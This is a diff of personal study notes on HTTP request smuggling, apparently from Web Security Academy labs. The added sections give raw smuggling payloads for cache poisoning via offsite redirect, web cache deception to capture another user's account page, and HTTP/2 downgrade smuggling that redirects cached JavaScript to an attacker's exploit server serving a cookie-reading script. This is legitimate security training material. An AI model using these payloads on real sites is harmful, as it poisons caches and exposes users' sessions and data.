@@ -5,7 +5,7 @@ http smuggling attack is a way for interfering with the way a website processes 
 
 ### Note
 When we have a get request, ti ignore the first header user X-Ignore attribute
-for POST request, use the body.
+for POST request, use the body. 
 
 ## How does it arise ?
 
@@ -476,3 +476,114 @@ We suppose that a reflected XSS happens in the `User-Agent`, we can see it in bu
 ## cache poisoning smuggled request
 
 Didn't really understand what is happening here
+OK, so the first thing we need to do is to find offline local redirect, when browsing the web server, and try to smuggle this request ! and we try to confirm the type of request, in out case it's a CE.TL
+
+The payload use is the following : 
+
+    POST / HTTP/1.1
+    Host: 0a7000280402947f81b193bf00290030.web-security-academy.net
+    Cookie: session=2bXEbqUkBtfcFXKLhKeIOLTWYbFtDKym
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 137
+    Transfer-Encoding: chunked
+
+    3
+    333
+    0
+
+    GET /post/next?postId=7 HTTP/1.1
+    Host: foobar.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 3
+
+    X=
+
+When we add `Host: foorbar.com`, in the next request the application will redirect the host into the foobar (offsite redirect), and here we can use out malicious website, and inject an XSS payload.
+
+We notice also the website requests a static asset `/resources/js/tracking.js` with age and cache-control, if we keep sending the request the age keeps going up, (seconds).
+What we gonna do is keep sending the `/resources/js/tracking.js` until the age is almost the max (27), and then send a smuggled request followed by another  `/resources/js/tracking.js` request.
+and each time someone accesses the page for 30 seconds, he will be redirected to our malicious website.
+
+## HTTP request smuggling to perform web cache deception
+
+* In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+* In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+
+The payload used is the following : 
+    
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 42
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /my-account HTTP/1.1
+    X-Ignore: X
+
+so that when the victim logs in, it appends its session cookies, and we get the value of what we wanted.
+still here we will use the same technique, send the cache multiple times to increase the age value, before sending the smuggled request couple of times, and then retry to send the cache request until get a 200 ok request
+(didn't quite understand tbh)
+# Advanced request smuggling
+## Detecting the vulnerability
+
+Here we use HTTP/2 normally it's secure but, some servers due to the RFC, might allow downgrading to http1.1 : The Payload to discover the vulnerability is to use differential attack.
+The payload used is the following : 
+
+    POST / HTTP/2
+    Host: 0acd00900429745f817a5c1f00a1009c.web-security-academy.net
+    Cookie: session=EQjwkwIIjWokqYsIjiddF9CGRY98cQWA
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+    GET /totot HTTP/1.1
+    X-Ignore: x
+
+We set the content-length to five, to smuggle the request after `x=1\r\n`, and we should get at some point en error response. 
+we need to keep trying in case that another user is browsing at the same time.
+## Solve the lab
+We will check an offsite redirect.
+pick one of the java script folders in the http requests and try to do a get request to that folder, it will be our local redirect.
+
+the payload to try an offline redirect request : 
+
+    POST / HTTP/2
+    Host: 0acd00900429745f817a5c1f00a1009c.web-security-academy.net
+    Cookie: session=EQjwkwIIjWokqYsIjiddF9CGRY98cQWA
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+    GET /resources/js HTTP/1.1
+    Host: toto.com
+    Content-length: 5
+
+    X=1
+
+We should have at some point (after 4 to 6 trials) a 302 found when executing a normal request
+
+Example of a response of a successful request
+
+    HTTP/2 302 Found
+    Location: https://toto.com/resources/js/
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 0
+
+Here we have to create our own malicious website and inject javascript payload into the response and don't forget to set th path to `/resources/js/` and `Content-Type: text/javascript; charset=utf-8`
+and the payload in the body `alert(document.cookie)` and set the website into the host of the smuggled request, so that the cache will redirect users to our malicious website.
+
+    POST / HTTP/2
+    Host: 0acd00900429745f817a5c1f00a1009c.web-security-academy.net
+    Cookie: session=EQjwkwIIjWokqYsIjiddF9CGRY98cQWA
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+    GET /resources/js HTTP/1.1
+    Host: exploit-0acf00460493743f81615b3b014600a7.exploit-server.net
+    Content-length: 5
+
+    X=1
+ and we should keep doing that until we have to 200 ok responses for both requests (attack and normal), better uses a script to launch the attack request followed bu a normal request with a 300ms lap between them.
